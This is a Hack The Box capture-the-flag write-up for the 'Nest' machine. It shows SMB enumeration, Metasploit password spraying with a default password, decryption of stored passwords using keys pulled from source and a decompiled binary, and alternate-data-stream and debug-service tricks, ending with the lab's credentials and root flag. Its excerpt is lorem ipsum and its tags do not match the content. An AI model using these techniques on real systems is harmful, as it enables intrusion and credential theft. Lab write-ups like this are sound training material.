---
layout: single
title: Nest - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-01-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-nest/nest_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-nest/nest_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n nest.htb
    PORT    STATE SERVICE       VERSION
    445/tcp open  microsoft-ds?
    4386/tcp open  unknown

    Host script results:
    |_clock-skew: -59m50s
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2020-01-27T06:54:14
    |_  start_date: 2020-01-26T15:09:37

2. Enumerate the smb share.
    root@nidus:~# smbclient -L 10.10.10.178
    Enter WORKGROUP\root's password:

    	Sharename       Type      Comment
    	---------       ----      -------
    	ADMIN$          Disk      Remote Admin
    	C$              Disk      Default share
    	Data            Disk
    	IPC$            IPC       Remote IPC
    	Secure$         Disk
    	Users           Disk

    root@nidus:~# smbclient \\\\nest.htb\\Users
      smb: \> ls
        .                                   D        0  Sun Jan 26 00:04:21 2020
        ..                                  D        0  Sun Jan 26 00:04:21 2020
        Administrator                       D        0  Fri Aug  9 17:08:23 2019
        C.Smith                             D        0  Sun Jan 26 08:21:44 2020
        L.Frost                             D        0  Thu Aug  8 19:03:01 2019
        R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
        TempUser                            D        0  Thu Aug  8 00:55:56 2019



    smb: \Shared\Templates\HR\> get "Welcome Email.txt"
      getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (3.5 KiloBytes/sec) (average 2.0 KiloBytes/sec)

    smb: \Shared\Maintenance\> get "Maintenance Alerts.txt"
      getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)


    root@nidus:/opt/htb/machines/nest# cat MaintenanceAlerts.txt
      There is currently no scheduled maintenance work

    root@nidus:/opt/htb/machines/nest# cat WelcomeEmail.txt
      We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

      You will find your home folder in the following location:
      \\HTB-NEST\Users\<USERNAME>

      If you have any issues accessing specific services or workstations, please inform the
      IT department and use the credentials below until all systems have been set up for you.

      Username: TempUser
      Password: welcome2019


      Thank you
      HR


3. We've found a list of 5 users, and what seems to be a default password. Lets see if any account hasn't changed the password yet.

    msf5 auxiliary(scanner/smb/smb_login) > run
      [*] 10.10.10.178:445      - 10.10.10.178:445 - Starting SMB login bruteforce
      [-] 10.10.10.178:445      - 10.10.10.178:445 - Failed: '.\Administrator:welcome2019',
      [-] 10.10.10.178:445      - 10.10.10.178:445 - Failed: '.\C.Smith:welcome2019',
      [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\L.Frost:welcome2019'
      [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\R.Thompson:welcome2019'
      [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\TempUser:welcome2019'
      [*] nest.htb:445          - Scanned 1 of 1 hosts (100% complete)
      [*] Auxiliary module execution completed

    We found three sets of working creds! Lets enumerate smb again using all the found accounts.

    L.Frost:welcome2019 - finds nothing interesting
    R.Thompson:welcome2019 - finds nothing interesting
    TempUser:welcome2019 - has access to all folders, and within IT\Configs we find a few interesting XML's.

    RUScanner - We find a new set of creds. The password looks base64 encoded however decoding it gives us nothing of use. c.smith:fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=
    NotepadPlusPlus - We find a new user from IT - Carl.
    Atlas - A few new names and possible users, Deanna Meyer (D.Meyer), Jolie Lenehan (J.Lenehan), Robert O'Hara (R.Ohara)

    root@nidus:/opt/htb/machines/nest/RuScanner# cat RU_config.xml
      <?xml version="1.0"?>
      <ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
      <Port>389</Port>
      <Username>c.smith</Username>
      <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>

    root@nidus:/opt/htb/machines/nest/NotepadPlusPlus# cat config.xml
      <?xml version="1.0" encoding="Windows-1252" ?>
      <NotepadPlus>
        ..
          <!-- The History of opened files list -->
          <FindHistory nbMaxFindHistoryPath="10" nbMaxFindHistoryFilter="10" nbMaxFindHistoryFind="10" nbMaxFindHistoryReplace="10" matchWord="no" matchCase="no" wrap="yes" directionDown="yes" fifRecuisive="yes" fifInHiddenFolder="no" dlgAlwaysVisible="no" fifFilterFollowsDoc="no" fifFolderFollowsDoc="no" searchMode="0" transparencyMode="0" transparency="150">
              <Find name="text" />
              <Find name="txt" />
              <Find name="itx" />
              <Find name="iTe" />
              <Find name="IEND" />
              <Find name="redeem" />
              <Find name="activa" />
              <Find name="activate" />
              <Find name="redeem on" />
              <Find name="192" />
              <Replace name="C_addEvent" />
          </FindHistory>
          <History nbMaxFile="15" inSubMenu="no" customLength="-1">
              <File filename="C:\windows\System32\drivers\etc\hosts" />
              <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
              <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
          </History>
      </NotepadPlus>

    root@nidus:/opt/htb/machines/nest/Atlas# cat Temp.XML
      <?xml version="1.0" encoding="UTF-8"?>
      <bs:Brainstorm xmlns:bs="http://schemas.microsoft.com/visio/2003/brainstorming"><bs:topic bs:TopicID="T1"><bs:text>Marketing Plan</bs:text><bs:topic bs:TopicID="T1.1"><bs:text>Product</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Deanna Meyer</bs:value></bs:prop><bs:topic bs:TopicID="T1.1.1"><bs:text>New features</bs:text></bs:topic><bs:topic bs:TopicID="T1.1.2"><bs:text>Competitive strengths</bs:text></bs:topic><bs:topic bs:TopicID="T1.1.3"><bs:text>Competitive weaknesses</bs:text></bs:topic></bs:topic><bs:topic bs:TopicID="T1.2"><bs:text>Placement</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Jolie Lenehan</bs:value></bs:prop></bs:topic><bs:topic bs:TopicID="T1.3"><bs:text>Price</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Robert O'Hara</bs:value></bs:prop></bs:topic><bs:topic bs:TopicID="T1.4"><bs:text>Promotion</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Robert O'Hara</bs:value></bs:prop><bs:topic bs:TopicID="T1.4.1"><bs:text>Advertising</bs:text></bs:topic><bs:topic bs:TopicID="T1.4.2"><bs:text>Mailings</bs:text></bs:topic><bs:topic bs:TopicID="T1.4.3"><bs:text>Trade shows</bs:text></bs:topic></bs:topic></bs:topic><bs:association bs:topic1="T1.4" bs:topic2="T1.3"/></bs:Brainstorm>

4. Add the new found users to our user-list and scan again using msf and default password 'welcome2019'
    msf5 auxiliary(scanner/smb/smb_login) > run
    [*] 10.10.10.178:445      - 10.10.10.178:445 - Starting SMB login bruteforce
    [-] 10.10.10.178:445      - 10.10.10.178:445 - Failed: '.\Administrator:welcome2019',
    [-] 10.10.10.178:445      - 10.10.10.178:445 - Failed: '.\C.Smith:welcome2019',
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\L.Frost:welcome2019'
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\R.Thompson:welcome2019'
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\TempUser:welcome2019'
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\Carl:welcome2019'
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\D.Meyer:welcome2019'
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\J.Lenehan:welcome2019'
    [+] 10.10.10.178:445      - 10.10.10.178:445 - Success: '.\R.Ohara:welcome2019'
    [*] nest.htb:445          - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

  All of the new found accounts are working with the default password, even Carl from IT. Lets start by enumerating shares.
    Carl - Nothing
    D.Meyer - Nothing
    J.Lenehan - Nothing
    R.Ohara - Nothing

  root@p3:/opt/htb/machines# smbmap -H 10.10.10.178 -u TempUser -p welcome2019 -R

5. From the NotepadPlusPlus config.xml we found the path \\HTB-NEST\Secure$\IT\Carl\ however we can't list it using smbclient.
   Instead we can mount the directory to read it's content. The Creds Carl:welcome2019 doesn't work, however TestUser does.

    root@p3:/opt/htb/machines/nest# mount -t cifs //nest.htb/Secure$/IT/Carl temp/ -o user=tempuser
      Password for tempuser@//nest.htb/Secure$/IT/Carl:  *********** (welcome2019)

    Within we find a VB-project called RUScanner, within there are some functions for encrypting and decrypting. We probably need
    to reverse engineer these in order to decrypt the hash we found earlier (fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=).

    Opening the project in Visual Studio and trying to run it gives us the error:
    "System.IO.FileNotFoundException: 'Could not find file 'C:\Users\PlayerThree\htb\machines\nest\RU\RUScanner\bin\Debug\RU_Config.xml'.'"
    We previously downloaded that .xml from the SMB Share, put it in the suggested dir and run the project again, it should now run
    smothly without any issues.

    Looking through the files we find the script Module1.vb containing a password decryption string. Under the password line we can
    simply print the password by typing "Console.WriteLine(test.password)", right click on the line and press "Run to Cursor".
    In the Autos output at the bottom we can see that the variable test.password contains string "xRxRxPANCAK3SxRxRx".

6. Mount the SMB Share \\10.10.10.178\Users\, login as C.Smith:xRxRxPANCAK3SxRxRx and grab user.txt from \C.Smith


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


 1. In C.Smith's directory we find a few files, a empty .txt, a .xml and an .exe.
    Reading the forums they say that the empty .txt is not in fact empty, but has data "flowing" through it. This is a vague hint of
    stream, which in fact means Alternate Data Streams (ADS).

    We investigate this by executing dir /R (/R - Display alternate data streams of the file.)

     Z:\C.Smith\HQK Reporting>dir /R
      Volume in drive Z has no label.
      Volume Serial Number is 2C6F-6A14
      Directory of Z:\C.Smith\HQK Reporting
       2019-08-09  00:06    <DIR>          .
       2019-08-09  00:06    <DIR>          ..
       2019-08-09  13:18    <DIR>          AD Integration Module
       2019-08-09  00:08                 0 Debug Mode Password.txt
                                        15 Debug Mode Password.txt:Password:$DATA
       2019-08-09  00:09               249 HQK_Config_Backup.xml
                      2 File(s)            249 bytes
                      3 Dir(s)  26 417 422 336 bytes free

     And we do infact find a hidden file. Open it using notepad and find the content "WBQ201953D8w".
         notepad Debug Mode Password.txt:Password:$DATA

 2. Login on the high port using telnet (telnet nest.htb 4386). Use the found debug password and we get new commands.
     >debug WBQ201953D8w
         Debug mode enabled. Use the HELP command to view additional commands that are now available

     >help
         This service allows users to run queries against databases using the legacy HQK format
         --- AVAILABLE COMMANDS ---
         LIST
         SETDIR <Directory_Name>
         RUNQUERY <Query_ID>
         DEBUG <Password>
         HELP <Command>
         SERVICE
         SESSION
         SHOWQUERY <Query_ID>

 3. Enumerate the box and we find HQK/LDAP/Ldap.conf
     >list
         Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
          QUERY FILES IN CURRENT DIRECTORY
         [1]   HqkLdap.exe
         [2]   Ldap.conf
         Current Directory: LDAP
     >showquery 2
         Domain=nest.local
         Port=389
         BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
         User=Administrator
         Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

 4. Another encrypted password, though this time for Administrator. Trying to decrypt it the same way as (temp)user gives us
    the error 'Padding is invalid and cannot be removed.'. Reading about this error, it is because we are using the wrong key to
    decrypt the data.

    From the vb-project, script file Utils.vb we find the decryption string (and key) on line 16:
     Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)

    Decompiling the .exe found in dir LDAP, HqkLdap.exe, with dotPeak and looking at it's decryption string we find another set of
    keys:
     string.Empty : CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256)

    Modify the current script in the vb-project to match the decompiled keys, run the program and we'll get the Administrator pass.
    Administrator:XtH4nkS4Pl4y1nGX

 5. Mount \\nest.htb\C$ as Administrator:XtH4nkS4Pl4y1nGX and grab root.txt.
     > type root.txt
         6594c2eb084bc0f08a42f0b94b878c41


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

   Visual Studio Download
       https://softfamous.com/visual-studio-2010/

   Visual Studio Coding
       https://docs.microsoft.com/en-us/dotnet/core/tutorials/debugging-with-visual-studio?tabs=csharp
